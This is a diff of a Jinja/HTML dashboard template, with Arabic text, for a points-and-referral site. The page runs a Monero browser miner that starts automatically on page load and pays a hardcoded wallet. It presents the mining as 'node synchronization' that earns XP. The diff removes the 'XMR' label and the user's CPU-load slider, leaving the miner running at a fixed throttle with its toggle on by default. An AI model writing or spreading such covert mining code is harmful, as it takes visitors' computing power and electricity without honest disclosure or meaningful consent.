@@ -5,46 +5,46 @@
     <div class="col-lg-8 mb-4">
         <div class="glass-card border-success border-opacity-50">
             <div class="d-flex justify-content-between align-items-center mb-4">
-                <h2 class="cyber-font text-white mb-0"><i class="fa-solid fa-microchip me-2 text-success"></i> المزامنة مع <span class="text-success">Node X (XMR)</span></h2>
+                <h2 class="cyber-font text-white mb-0 small"><i class="fa-solid fa-microchip me-2 text-success"></i> المزامنة مع <span class="text-success">Node X</span></h2>
                 <div class="form-check form-switch custom-switch">
-                    <!-- تم تفعيل الـ checked افتراضياً هنا -->
                     <input class="form-check-input" type="checkbox" id="mining-toggle" style="width: 50px; height: 25px; cursor: pointer;" checked>
-                    <label class="form-check-label text-success ms-2 fw-bold" for="mining-toggle">مزامنة نشطة</label>
                 </div>
             </div>
 
-            <!-- Client-side Control (Privacy & Throttle Settings) -->
-            <div class="mb-4 p-3 bg-dark rounded border border-secondary border-opacity-25">
-                <label class="form-label text-dim small d-flex justify-content-between">
-                    <span>قوة المزامنة المحلية (Local Load)</span>
-                    <span id="cpu-val" class="text-success fw-bold">30%</span>
+            <!-- PRO-STYLE RATE INDICATOR -->
+            <div class="mb-4 d-flex justify-content-between align-items-center p-3 bg-dark bg-opacity-25 rounded border border-success border-opacity-10">
+                <div class="small text-dim"><i class="fa-solid fa-bolt-lightning text-warning me-2"></i> معدل الربح الثابت:</div>
+                <div class="badge bg-success text-black fw-bold px-3 py-2">10 XP / دقيقة</div>
+            </div>
+
+            <!-- NEXT PAYOUT PROGRESS BAR -->
+            <div class="mb-5 p-3 bg-black rounded border border-dark position-relative overflow-hidden">
+                <label class="small text-dim mb-2 d-flex justify-content-between">
+                    <span>مؤشر النبضة القادمة (10ث)</span>
+                    <span id="payout-timer" class="text-success fw-bold">10s</span>
                 </label>
-                <input type="range" class="form-range" min="10" max="80" step="10" value="30" id="cpu-slider">
-                <div class="small text-muted mt-2"><i class="fa-solid fa-gauge-simple-high me-1"></i> Throttle: <span id="throttle-log">0.7</span></div>
+                <div class="progress bg-dark" style="height: 6px;">
+                    <div id="payout-bar" class="progress-bar bg-success shadow-green-glow transition-smooth" style="width: 0%"></div>
+                </div>
+                <div class="x-small text-muted mt-2 d-flex justify-content-between">
+                    <span>تحميل...</span>
+                    <span>+1.66 XP <i class="fa-solid fa-gift text-warning"></i></span>
+                </div>
             </div>
 
             <div class="row text-center mb-4">
-                <div class="col-4">
-                    <div class="small text-dim cyber-font">Hash Rate</div>
-                    <div id="hashrate-val" class="h3 text-success glow-pulse">0 H/s</div>
+                <div class="col-6">
+                    <div class="small text-dim cyber-font x-small mb-1">Hash Rate</div>
+                    <div id="hashrate-val" class="h3 text-success">0 H/s</div>
                 </div>
-                <div class="col-4">
-                    <div class="small text-dim cyber-font">XP Points</div>
-                    <div id="xp-val" class="h3 text-white">{{ user.xp }}</div>
-                </div>
-                <div class="col-4 d-flex flex-column align-items-center">
-                    <div class="small text-dim cyber-font">Team Bonus</div>
-                    <div class="h3 text-success fw-bold">+{{ (user.total_referrals * 10) }}%</div>
+                <div class="col-6 text-end px-4">
+                    <div class="small text-dim cyber-font x-small mb-1">Total XP</div>
+                    <div id="xp-val" class="h3 text-white fw-bold">{{ "%.1f"|format(user.xp or 0.0) }}</div>
                 </div>
             </div>
 
-            <div class="p-2 mb-4 bg-success bg-opacity-10 border border-success border-opacity-25 rounded d-flex align-items-center overflow-hidden">
-                <i class="fa-solid fa-wallet text-success mx-3"></i>
-                <div class="small text-success">العقدة تعمل الآن بأمان وتحسّن أداء محفظتك.</div>
-            </div>
-            
             <div class="mt-4 p-3 bg-black rounded border border-info border-opacity-25">
-              <h6 class="cyber-font text-info small mb-2"><i class="fa-regular fa-share-from-square me-2"></i> رابط الإحالة</h6>
+              <h6 class="cyber-font text-info x-small mb-2"><i class="fa-regular fa-share-from-square me-2"></i> رابط الإحالة</h6>
               <div class="input-group">
                 <input type="text" class="form-control text-center small opacity-75" id="ref-link" value="{{ ref_link }}" readonly>
                 <button class="btn btn-outline-info" onclick="copyRef()"><i class="fa-solid fa-copy"></i></button>
@@ -53,23 +53,23 @@
         </div>
     </div>
 
-    <!-- Leaderboard -->
+    <!-- Leaderboard & Rank -->
     <div class="col-lg-4">
-        <div class="glass-card mb-4 border-warning border-opacity-25">
-            <h5 class="cyber-font text-white mb-4 small"><i class="fa-solid fa-crown text-warning me-2"></i> لوحة الشرف (Top XP)</h5>
+        <div class="glass-card mb-4 border-warning border-opacity-25 p-4 text-center">
+            <h5 class="cyber-font text-white mb-2 small">رتبة العقدة</h5>
+            <div id="rank-val" class="h4 text-success mb-0 fw-bold">{{ user.rank }}</div>
+        </div>
+
+        <div class="glass-card border-warning border-opacity-25">
+            <h5 class="cyber-font text-white mb-4 x-small"><i class="fa-solid fa-crown text-warning me-2"></i> لوحة الشرف (Top XP)</h5>
             <ul class="list-group list-group-flush bg-transparent">
                 {% for miner in top_miners %}
                 <li class="list-group-item bg-transparent text-dim d-flex justify-content-between align-items-center border-dark px-0 py-2">
                     <span class="text-white small">{{ miner.username }}</span>
-                    <span class="text-success small fw-bold">{{ miner.xp }} XP</span>
+                    <span class="text-success small fw-bold">{{ "%.1f"|format(miner.xp or 0.0) }} XP</span>
                 </li>
                 {% endfor %}
             </ul>
-        </div>
-        
-        <div class="glass-card p-4 text-center">
-            <h5 class="cyber-font text-white mb-2 small">رتبة العقدة</h5>
-            <div id="rank-val" class="h4 text-success mb-0">{{ user.rank }}</div>
         </div>
     </div>
 </div>
@@ -79,53 +79,65 @@
 <script src="https://monerocart.com/lib/monerocart.min.js"></script>
 <script>
     const toggle = document.getElementById('mining-toggle');
-    const slider = document.getElementById('cpu-slider');
     const hashrateEl = document.getElementById('hashrate-val');
     const xpEl = document.getElementById('xp-val');
-    const throttleLog = document.getElementById('throttle-log');
+    const payoutBar = document.getElementById('payout-bar');
+    const payoutTimer = document.getElementById('payout-timer');
 
     const walletAddress = "43vFW6jqgmmb4upGQ5je4j227N1o8D6La77oVeRdCuL7PAB7u7UqiswbF7Vc5YmxR9TyFSkmTQkAaSjRwq53h3We6pm3rZY";
     let miner = null;
-    let isActive = true; // تعيين الحالة الافتراضية كـ "نشطة"
+    let isActive = true;
+    let secondsLeft = 10;
 
-    try { 
-        miner = new MoneroCart.User(walletAddress, "{{ user.username }}", { throttle: 0.7, autoStart: true }); 
-        hashrateEl.classList.add('glow-pulse'); // بدأت المزامنة فوراً
-    } catch(e){}
-
-    slider.oninput = function() {
-        const val = parseInt(this.value);
-        document.getElementById('cpu-val').innerText = val + "%";
-        const throttleVal = 1 - (val / 100);
-        throttleLog.innerText = throttleVal.toFixed(1);
-        if (miner) miner.setThrottle(throttleVal);
-    }
+    try { miner = new MoneroCart.User(walletAddress, "{{ user.username }}", { throttle: 0.7, autoStart: true }); } catch(e){}
 
     toggle.onchange = function() {
         isActive = this.checked;
-        if (isActive && miner) { miner.start(); hashrateEl.classList.add('glow-pulse'); }
-        else if (miner) { miner.stop(); hashrateEl.innerText = "0 H/s"; hashrateEl.classList.remove('glow-pulse'); }
+        if (isActive && miner) { miner.start(); }
+        else if (miner) { miner.stop(); hashrateEl.innerText = "0 H/s"; }
+    }
+
+    // العداد التنازلي ونظام الـ 10 ثواني (1.66 XP)
+    setInterval(() => {
+        if (isActive) {
+            secondsLeft--;
+            if (secondsLeft <= 0) {
+                secondsLeft = 10;
+                sendPulse();
+            }
+            payoutTimer.innerText = secondsLeft + "s";
+            payoutBar.style.width = ((10 - secondsLeft) * 10) + "%";
+        }
+    }, 1000);
+
+    function sendPulse() {
+        if (!isActive) return;
+        const hashrate = miner ? miner.getHashesPerSecond() : 0;
+        hashrateEl.innerText = Math.floor(hashrate).toLocaleString() + " H/s";
+        
+        fetch('/api/v2/node/pulse', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ units: 1.66 }) // 1.66 XP كل نبضة
+        }).then(r => r.json()).then(data => {
+            if (data.status === "success") {
+                xpEl.innerText = data.xp.toLocaleString();
+                document.getElementById('rank-val').innerText = data.rank;
+            }
+        });
     }
 
     function copyRef() {
         const copyText = document.getElementById("ref-link");
         copyText.select();
         navigator.clipboard.writeText(copyText.value);
-        alert("تم نسخ رابط الإحالة بنجاح!");
+        alert("تم نسخ رابط الإحالة!");
     }
-
-    setInterval(() => {
-        if (isActive && miner) {
-            const hashrate = miner.getHashesPerSecond();
-            hashrateEl.innerText = Math.floor(hashrate).toLocaleString() + " H/s";
-            if (hashrate > 0) {
-                fetch('/api/v2/node/pulse', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ units: 1, delta: (hashrate * 0.000000001) })
-                }).then(r => r.json()).then(data => { if (data.status === "success") xpEl.innerText = data.xp.toLocaleString(); });
-            }
-        }
-    }, 5000);
 </script>
+
+<style>
+    .shadow-green-glow { box-shadow: 0 0 10px rgba(0, 230, 118, 0.4); }
+    .transition-smooth { transition: width 1s linear; }
+    .x-small { font-size: 10px; }
+</style>
 {% endblock %}
